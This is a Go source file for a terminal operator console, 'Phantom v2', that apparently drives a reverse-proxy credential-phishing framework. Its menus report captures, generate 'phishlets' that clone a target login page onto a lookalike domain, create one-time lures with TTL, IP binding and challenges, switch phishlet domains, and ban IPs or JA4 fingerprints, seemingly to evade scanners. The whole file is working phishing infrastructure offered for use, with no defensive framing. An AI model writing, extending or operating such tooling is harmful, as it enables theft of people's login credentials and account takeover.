// TUI на bubbletea: главное меню + экраны dashboard/config/phishlets/
// block/lure/reload/generate. Стили lipgloss, проверка связи при старте.
package menu

import (
	"fmt"
	"sort"
	"strings"

	"github.com/charmbracelet/bubbles/list"
	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
)

var (
	titleStyle = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("63")).
			Border(lipgloss.RoundedBorder()).BorderForeground(lipgloss.Color("63")).
			Padding(0, 1)
	okStyle  = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("42"))
	errStyle = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("196"))
	dimStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("241"))
	boxStyle = lipgloss.NewStyle().Border(lipgloss.RoundedBorder()).
			BorderForeground(lipgloss.Color("238")).Padding(0, 1)
	footStyle = dimStyle.Copy().MarginTop(1)
)

type screen int

const (
	sConnect screen = iota
	sMenu
	sDashboard
	sConfig
	sPhishlets
	sBlock
	sLure
	sReload
	sGenerate
	sPhishDomain
	sPhishToggle
	sResult
)

type statusMsg struct {
	err error
	node string
}

type item struct {
	title, desc string
	goes  screen
}

func (i item) Title() string       { return i.title }
func (i item) Description() string { return i.desc }
func (i item) FilterValue() string { return i.title }

type model struct {
	client *Client
	screen screen
	conn   string // "node=..." или текст ошибки
	list   list.Model
	inputs []textinput.Model
	labels []string
	focus  int
	result string
	isErr  bool
}

func initialModel(c *Client) model {
	items := []list.Item{
		item{"Dashboard", "stats сервера · captures · uptime", sDashboard},
		item{"Config", "домены · TLS · нода (без секретов)", sConfig},
		item{"Phishlets", "кто загружен в стор", sPhishlets},
		item{"Block IP", "бан IP/JA4 с причиной", sBlock},
		item{"Smart lure+", "одноразовая приманка с TTL/IP/challenge", sLure},
		item{"Reload", "hot-reload фишлетов без рестарта", sReload},
		item{"Generate", "новый фишлет: origin→domain→id", sGenerate},
		item{"Phishlet domain", "сменить base_domains", sPhishDomain},
		item{"Phishlet on/off", "вкл/выкл без рестарта", sPhishToggle},
		item{"Quit", "выход (сервер продолжает работать)", sMenu},
	}
	delegate := list.NewDefaultDelegate()
	delegate.Styles.SelectedTitle = delegate.Styles.SelectedTitle.
		Foreground(lipgloss.Color("63")).Bold(true)
	delegate.Styles.SelectedDesc = delegate.Styles.SelectedDesc.
		Foreground(lipgloss.Color("241"))
	l := list.New(items, delegate, 56, 18)
	l.Title = "Phantom v2 · Operator"
	l.SetShowStatusBar(false)
	l.SetFilteringEnabled(false)
	l.Styles.Title = titleStyle.Copy().BorderStyle(lipgloss.NormalBorder())
	return model{client: c, screen: sConnect, list: l}
}

// Run запускает TUI. Возвращает управление после Quit.
func Run(c *Client) error {
	p := tea.NewProgram(initialModel(c))
	_, err := p.Run()
	return err
}

func (m model) Init() tea.Cmd {
	return func() tea.Msg {
		st, err := m.client.Stats()
		if err != nil {
			return statusMsg{err: err}
		}
		node, _ := st["node"].(string)
		if node == "" {
			node = "?"
		}
		return statusMsg{node: node}
	}
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case statusMsg:
		if msg.err != nil {
			m.conn = "ERR: " + msg.err.Error()
			m.screen = sMenu
			m.result, m.isErr = "Сервер недоступен:\n"+msg.err.Error()+
				"\n\nПроверь: запущен ли phantom, верный ли -api адрес.", true
			m.screen = sResult
			return m, nil
		}
		m.conn = "node=" + msg.node
		m.screen = sMenu
		return m, nil
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c":
			return m, tea.Quit
		case "esc":
			if m.screen != sMenu && m.screen != sConnect {
				m.screen = sMenu
				return m, nil
			}
		case "enter":
			return m.onEnter()
		case "tab", "shift+tab", "up", "down":
			if m.isForm() {
				return m.moveFocus(msg.String())
			}
		}
	case tea.WindowSizeMsg:
		m.list.SetSize(msg.Width-8, msg.Height-10)
	}
	var cmd tea.Cmd
	if m.screen == sMenu {
		m.list, cmd = m.list.Update(msg)
		return m, cmd
	}
	if m.isForm() {
		for i := range m.inputs {
			if i == m.focus {
				m.inputs[i], cmd = m.inputs[i].Update(msg)
				return m, cmd
			}
		}
	}
	return m, nil
}

func (m model) isForm() bool {
	return m.screen == sBlock || m.screen == sLure || m.screen == sGenerate ||
		m.screen == sPhishDomain || m.screen == sPhishToggle
}

func (m model) moveFocus(key string) (tea.Model, tea.Cmd) {
	m.inputs[m.focus].Blur()
	switch key {
	case "tab", "down":
		m.focus = (m.focus + 1) % len(m.inputs)
	case "shift+tab", "up":
		m.focus = (m.focus - 1 + len(m.inputs)) % len(m.inputs)
	}
	m.inputs[m.focus].Focus()
	return m, nil
}

func mkInputs(labels []string, defaults []string) ([]textinput.Model, []string) {
	out := make([]textinput.Model, len(labels))
	for i, p := range labels {
		ti := textinput.New()
		ti.Placeholder = p
		ti.Prompt = "› "
		ti.TextStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("252"))
		if i < len(defaults) && defaults[i] != "" {
			ti.SetValue(defaults[i])
		}
		if i == 0 {
			ti.Focus()
		}
		ti.CharLimit = 128
		ti.Width = 44
		out[i] = ti
	}
	return out, labels
}

func (m model) onEnter() (tea.Model, tea.Cmd) {
	if m.screen == sMenu {
		sel, ok := m.list.SelectedItem().(item)
		if !ok {
			return m, nil
		}
		if sel.title == "Quit" {
			return m, tea.Quit
		}
		m.screen = sel.goes
		m.result, m.isErr = "", false
		switch sel.goes {
		case sDashboard:
			st, err := m.client.Stats()
			if err != nil {
				return m.showResult("stats: "+err.Error(), true), nil
			}
			ph, _ := m.client.Phishlets()
			return m.showResult(fmt.Sprintf(
				"node      %v\nphishlets %v\nuptime    %vs\n\nзагружены:\n  %s",
				st["node"], st["phishlets"], st["uptime_s"], strings.Join(ph, "\n  ")), false), nil
		case sConfig:
			cfg, err := m.client.ServerConfig()
			if err != nil {
				return m.showResult("config: "+err.Error(), true), nil
			}
			keys := make([]string, 0, len(cfg))
			for k := range cfg {
				keys = append(keys, k)
			}
			sort.Strings(keys)
			var b strings.Builder
			for _, k := range keys {
				fmt.Fprintf(&b, "%-14s %v\n", k, cfg[k])
			}
			return m.showResult(strings.TrimRight(b.String(), "\n"), false), nil
		case sPhishlets:
			ph, err := m.client.Phishlets()
			if err != nil {
				return m.showResult("phishlets: "+err.Error(), true), nil
			}
			return m.showResult("в строю:\n  ▸ "+strings.Join(ph, "\n  ▸ "), false), nil
		case sBlock:
			m.inputs, m.labels = mkInputs(
				[]string{"IP или JA4", "причина"},
				[]string{"", "operator"})
			m.focus = 0
		case sLure:
			m.inputs, m.labels = mkInputs(
				[]string{"path  (/l/xxx)", "phishlet id", "ttl мин  (0=∞)", "max uses  (1=однораз)", "bound ip  (пусто=любой)", "challenge y/n"},
				[]string{"/l/op01", "labtest", "120", "1", "", "y"})
			m.focus = 0
		case sReload:
			if err := m.client.Reload(); err != nil {
				return m.showResult("reload: "+err.Error(), true), nil
			}
			return m.showResult("стор перечитан без рестарта", false), nil
		case sGenerate:
			m.inputs, m.labels = mkInputs(
				[]string{"origin  (login.x.com)", "domain  (p.test)", "id"},
				[]string{"", "", ""})
			m.focus = 0
		case sPhishDomain:
			m.inputs, m.labels = mkInputs(
				[]string{"phishlet id", "domains csv"},
				[]string{"", ""})
			m.focus = 0
		case sPhishToggle:
			m.inputs, m.labels = mkInputs(
				[]string{"phishlet id", "on/off y/n"},
				[]string{"", ""})
			m.focus = 0
		}
		return m, nil
	}
	switch m.screen {
	case sBlock:
		if m.inputs[0].Value() == "" {
			return m.showResult("нужен IP/JA4", true), nil
		}
		if err := m.client.Block(m.inputs[0].Value(), m.inputs[1].Value()); err != nil {
			return m.showResult("block: "+err.Error(), true), nil
		}
		return m.showResult("забанен: "+m.inputs[0].Value(), false), nil
	case sLure:
		ch := strings.ToLower(strings.TrimSpace(m.inputs[5].Value()))
		if err := m.client.SmartLure(
			m.inputs[0].Value(), m.inputs[1].Value(),
			atoi(m.inputs[2].Value()), atoi(m.inputs[3].Value()),
			m.inputs[4].Value(), ch == "y" || ch == "yes" || ch == "1",
		); err != nil {
			return m.showResult("lure: "+err.Error(), true), nil
		}
		return m.showResult("приманка создана: "+m.inputs[0].Value(), false), nil
	case sGenerate:
		yml, err := m.client.Generate(m.inputs[0].Value(), m.inputs[1].Value(), m.inputs[2].Value())
		if err != nil {
			return m.showResult("generate: "+err.Error(), true), nil
		}
		lines := strings.SplitN(yml, "\n", 14)
		return m.showResult(strings.Join(lines, "\n")+"\n…", false), nil
	case sPhishDomain:
		raw := strings.ReplaceAll(m.inputs[1].Value(), " ", ",")
		var domains []string
		for _, s := range strings.Split(raw, ",") {
			if s = strings.TrimSpace(s); s != "" {
				domains = append(domains, s)
			}
		}
		if m.inputs[0].Value() == "" || len(domains) == 0 {
			return m.showResult("id + domains required", true), nil
		}
		if err := m.client.SetPhishlet(m.inputs[0].Value(), domains, nil); err != nil {
			return m.showResult("domain: " + err.Error(), true), nil
		}
		return m.showResult("domains: " + strings.Join(domains, ", "), false), nil
	case sPhishToggle:
		v := strings.ToLower(strings.TrimSpace(m.inputs[1].Value()))
		on := v == "y" || v == "yes" || v == "1" || v == "on"
		if m.inputs[0].Value() == "" {
			return m.showResult("id required", true), nil
		}
		if err := m.client.SetPhishlet(m.inputs[0].Value(), nil, &on); err != nil {
			return m.showResult("on/off: " + err.Error(), true), nil
		}
		state := "off"
		if on {
			state = "on"
		}
		return m.showResult(m.inputs[0].Value()+" "+state, false), nil
	}
	return m, nil
}

func (m model) showResult(s string, isErr bool) model {
	m.screen, m.result, m.isErr = sResult, s, isErr
	return m
}

func atoi(s string) int {
	n := 0
	for _, c := range strings.TrimSpace(s) {
		if c < '0' || c > '9' {
			return n
		}
		n = n*10 + int(c-'0')
	}
	return n
}

func (m model) header() string {
	conn := dimStyle.Render(m.conn)
	if strings.HasPrefix(m.conn, "ERR") {
		conn = errStyle.Render(m.conn)
	}
	return titleStyle.Render("◆ Phantom v2") + "  " + conn + "\n" +
		footStyle.Render("esc назад · tab поле · enter выполнить · ctrl+c выход") + "\n\n"
}

func (m model) View() string {
	switch m.screen {
	case sConnect:
		return m.header() + "подключение к API…"
	case sMenu:
		return m.header() + m.list.View()
	case sResult:
		st := okStyle.Render("✓ OK")
		if m.isErr {
			st = errStyle.Render("✗ ERR")
		}
		return m.header() + st + "\n" + boxStyle.Render(m.result)
	default:
		if m.isForm() {
			var b strings.Builder
			b.WriteString(m.header())
			for i, in := range m.inputs {
				mark := "  "
				if i == m.focus {
					mark = okStyle.Render("▸ ")
				}
				b.WriteString(dimStyle.Render(m.labels[i]) + "\n")
				b.WriteString(mark + in.View() + "\n")
			}
			b.WriteString(footStyle.Render("enter — выполнить"))
			return b.String()
		}
		return m.header()
	}
}
